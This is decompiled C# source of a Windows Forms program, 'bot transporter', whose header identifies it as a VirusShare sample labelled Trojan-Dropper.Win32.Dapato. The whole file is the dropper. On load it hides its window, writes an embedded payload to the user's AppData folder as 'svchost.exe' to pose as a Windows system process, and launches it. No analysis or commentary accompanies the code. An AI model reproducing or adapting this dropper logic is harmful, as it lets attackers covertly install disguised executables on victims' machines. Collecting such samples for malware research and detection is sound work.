// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.Form1
// Assembly: bot transporter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0F7E06B0-CFC0-40D8-B553-FFDB0BC0A6AC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Dropper.Win32.Dapato.bwty-349f387ee3ad74ff8b5ab12b70875899f75e1399dcc1ebc41ecc998b24754a0c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using WindowsApplication1.My;

namespace WindowsApplication1
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 264);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.Visible = false;
      this.Opacity = Conversions.ToDouble("0");
      this.ShowInTaskbar = false;
      string str = MyProject.User.Name.Split('\\')[1];
      if (!File.Exists("C:\\Users\\" + str + "\\AppData\\Roaming\\svchost.exe"))
      {
        MyProject.Computer.FileSystem.WriteAllBytes("C:\\Users\\" + str + "\\AppData\\Roaming\\svchost.exe", WindowsApplication1.My.Resources.Resources.svchost, true);
        Interaction.Shell("C:\\Users\\" + str + "\\AppData\\Roaming\\svchost.exe");
      }
      else
      {
        if (!File.Exists("C:\\Users\\" + str + "\\AppData\\Roaming\\svchost.exe"))
          return;
        Interaction.Shell("C:\\Users\\" + str + "\\AppData\\Roaming\\svchost.exe");
      }
    }
  }
}
